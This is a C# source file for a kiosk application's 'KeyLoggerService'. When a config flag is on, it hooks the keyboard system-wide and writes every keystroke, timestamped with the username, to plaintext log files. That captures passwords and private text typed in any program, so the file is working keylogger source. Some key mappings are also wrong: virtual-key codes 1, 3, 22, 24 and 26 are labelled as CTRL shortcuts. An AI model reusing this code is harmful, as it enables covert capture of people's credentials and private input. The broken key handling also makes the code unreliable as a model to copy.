using System.Runtime.InteropServices;

namespace ApacKiosk.Services;

public class KeyLoggerService : IDisposable
{
    private readonly int _userId;
    private IntPtr _hookId = IntPtr.Zero;
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_SYSKEYDOWN = 0x0104;
    private LowLevelKeyboardProc? _proc;
    private StreamWriter? _writer;
    private const string DefaultFolder = "Logs\\Keylogs";

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    public KeyLoggerService(int userId)
    {
        _userId = userId;
    }

    public async Task StartAsync()
    {
        var enabled = Data.DatabaseHelper.GetMonitoringConfig("keylogger", "enabled", "false");
        if (enabled.ToLower() != "true") return;

        var folder = Data.DatabaseHelper.GetMonitoringConfig("keylogger", "folder_path", DefaultFolder);
        Directory.CreateDirectory(folder);

        var fileMode = Data.DatabaseHelper.GetMonitoringConfig("keylogger", "file_mode", "per_day");
        string filename = fileMode == "per_day"
            ? $"keylog_{DateTime.Now:yyyyMMdd}_user{_userId}.txt"
            : $"keylog_session_{DateTime.Now:yyyyMMdd_HHmmss}_user{_userId}.txt";
        string fullPath = Path.Combine(folder, filename);

        _writer = new StreamWriter(fullPath, append: true) { AutoFlush = true };
        Data.DatabaseHelper.InsertLog("keylog", _userId, fullPath, null);

        _proc = HookCallback;
        using var curProcess = System.Diagnostics.Process.GetCurrentProcess();
        using var curModule = curProcess.MainModule;
        _hookId = SetWindowsHookEx(WH_KEYBOARD_LL, _proc,
            GetModuleHandle(curModule?.ModuleName), 0);

        await Task.CompletedTask;
    }

    public void Stop()
    {
        if (_hookId != IntPtr.Zero)
        {
            UnhookWindowsHookEx(_hookId);
            _hookId = IntPtr.Zero;
        }
        _writer?.Close();
        _writer = null;
    }

    private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
        {
            int vkCode = Marshal.ReadInt32(lParam);

            var username = Data.DatabaseHelper.QueryFirstOrDefault<Models.User>(
                "SELECT username FROM users WHERE id = @id", new { id = _userId })?.Username ?? "unknown";

            string key = vkCode switch
            {
                8 => "[BACKSPACE]",
                9 => "[TAB]",
                13 => "[ENTER]",
                20 => "[CAPSLOCK]",
                27 => "[ESC]",
                32 => " ",
                46 => "[DEL]",
                1 => "[CTRL+A]",
                3 => "[CTRL+C]",
                24 => "[CTRL+X]",
                22 => "[CTRL+V]",
                26 => "[CTRL+Z]",
                0x10 => "[SHIFT]",
                0x11 => "[CTRL]",
                0x12 => "[ALT]",
                0x5B => "[WIN]",
                _ => null
            };

            if (key == null)
            {
                bool caps = (GetKeyState(0x14) & 0x0001) != 0;
                bool shift = (GetKeyState(0x10) & 0x8000) != 0;
                bool upper = caps ^ shift;
                key = ((Keys)vkCode).ToString();
                if (key.Length == 1)
                    key = upper ? key.ToUpper() : key.ToLower();
            }

            try
            {
                lock (this)
                {
                    _writer?.WriteLine($"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {username}: {key}");
                }
            }
            catch { }
        }

        return CallNextHookEx(_hookId, nCode, wParam, lParam);
    }

    [DllImport("user32.dll")]
    private static extern short GetKeyState(int nVirtKey);

    public void Dispose()
    {
        Stop();
        _writer?.Dispose();
    }
}
